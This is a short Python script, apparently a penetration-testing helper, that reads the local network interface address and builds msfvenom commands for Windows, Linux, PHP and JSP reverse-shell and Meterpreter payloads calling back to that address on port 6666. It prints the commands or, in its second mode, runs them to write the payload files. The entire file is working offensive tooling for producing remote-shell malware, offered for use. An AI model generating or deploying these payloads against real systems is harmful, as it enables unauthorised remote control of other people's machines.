import os
import sys
import netifaces as ni
import sys

bann = """

           _.-''|''-._
        .-'     |     `-.
      .'\       |       /`.
    .'   \      |      /   `.
    \     \     |     /     /
     `\    \    |    /    /'
       `\   \   |   /   /'
         `\  \  |  /  /'
        _.-`\ \ | / /'-._
       {_____`\\|//'_____}
               `-'
"""
print(bann)

if len(sys.argv) != 3:
    print("Syntax: {} <interface name> <type>".format(sys.argv[0]))
    print("Type 1: spits out commands.")
    print("Type 2: creates shells.")
    exit()

# get ip
winterface = sys.argv[1]

ni.ifaddresses(winterface)
ip = ni.ifaddresses(winterface)[ni.AF_INET][0]['addr']

# take in desired ip address
run_type = int(sys.argv[2])
this_ip = ip
this_port = 6666 # TODO: this is static for now but should make option to cycle/send in on command line
shell_list =[]

# add shells to list
shell_list.append("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -f exe > win_shell_{}_{}.exe".format(this_ip, this_port, this_ip, this_port))

shell_list.append("msfvenom -p linux/x86/shell_reverse_tcp LHOST={} LPORT={} -f elf > lin_shell_{}_{}.elf".format(this_ip,this_port, this_ip, this_port))

shell_list.append("msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > win_met_{}_{}.exe".format(this_ip, this_port, this_ip, this_port))

shell_list.append("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf > lin_met_{}_{}.elf".format(this_ip,this_port, this_ip, this_port))

shell_list.append("msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw > php_met_{}_{}.php".format(this_ip,this_port, this_ip, this_port))

shell_list.append("msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f raw > war_met_{}_{}.war".format(this_ip,this_port, this_ip, this_port))

print("\tSHELLCOME TO SHELL.\n")

type_strang = ["  [ We are doing commands only! ]","  [ Let's make some bloody shells! ]"]
print(type_strang[run_type-1])
print("\n\n")

for shell in shell_list:
    print("COMMAND: {}".format(shell))
    if run_type==2:
        os.system(shell)
        print("Saved!\n")
